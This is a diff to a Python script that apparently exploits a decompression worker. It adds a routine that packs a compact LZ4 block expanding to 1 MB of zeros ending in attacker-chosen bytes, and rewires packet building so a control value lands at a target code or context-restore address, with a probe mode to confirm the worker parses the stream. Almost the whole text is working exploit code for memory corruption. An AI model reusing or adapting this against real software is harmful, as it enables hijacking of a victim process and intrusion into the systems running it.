@@ -236,6 +236,37 @@ def lz4_zeros(size):
     return bytes(out)
 
 
+def lz4_zeros_tail(size, tail):
+    """Raw LZ4 block decompressing to `size` bytes: zeros, then `tail`.
+
+    Much smaller than a stored chunk when `tail` sits at the end, because the
+    zero run costs ~4 KB of length extension instead of `size` raw bytes.
+    """
+    body = size - len(tail)
+    if body < 9 or not tail:
+        raise ValueError("lz4_zeros_tail: layout")
+    code = (body - 1) - 4                # 1 literal + match
+    out = bytearray([(1 << 4) | min(code, 15), 0x00, 0x01, 0x00])
+    if code >= 15:
+        rest = code - 15
+        while rest >= 255:
+            out.append(255)
+            rest -= 255
+        out.append(rest)
+    n = len(tail)
+    if n >= 15:
+        out.append((15 << 4) | 0)
+        rest = n - 15
+        while rest >= 255:
+            out.append(255)
+            rest -= 255
+        out.append(rest)
+    else:
+        out.append(n << 4)
+    out += tail
+    return bytes(out)
+
+
 def build_packet(target, ctl, base=None):
     """One packet whose decompressed output ends with `ctl` at `target`.
 
@@ -258,7 +289,12 @@ def build_packet(target, ctl, base=None):
         stream += struct.pack("<I", len(block)) + block
     payload = bytearray(ZERO_CHUNK)
     payload[ctl_at:ctl_at + len(ctl)] = ctl
-    stream += struct.pack("<I", 0x80000000 | len(payload)) + payload
+    if ctl_at + len(ctl) == ZERO_CHUNK:
+        # ctl at the chunk tail: compress the whole 1 MB chunk (~20 bytes)
+        block = lz4_zeros_tail(ZERO_CHUNK, ctl)
+        stream += struct.pack("<I", len(block)) + block
+    else:
+        stream += struct.pack("<I", 0x80000000 | len(payload)) + payload
     return bytes(stream), total
 
 
@@ -425,15 +461,15 @@ def run(code_path, bundle_path, walk_len=None, span=None, block=None,
         if packet:
             target = CONTEXT_RESTORE or CODE_ADDR
             base = OUT_BASE if out_base is None else out_base
+            aim = WRITE_ADDR if target_addr is None else target_addr
             if probe_chunk:
                 # first chunk claims > 1MB: the worker's guard prints and
                 # spins, proving it parsed our stream at all.
                 stream = struct.pack("<I", 0x200000) + bytes(20)  # 24 bytes
                 total = 0x200000
             else:
-                aim = WRITE_ADDR if target_addr is None else target_addr
                 stream, total = build_packet(aim, target, base)
-            print(f"packet {len(stream):#x} bytes -> {WRITE_ADDR:#x} "
+            print(f"packet {len(stream):#x} bytes -> {aim:#x} "
                   f"(total {total:#x})", flush=True)
             start = time.monotonic()
             wait = 20000 if probe_chunk else 180000
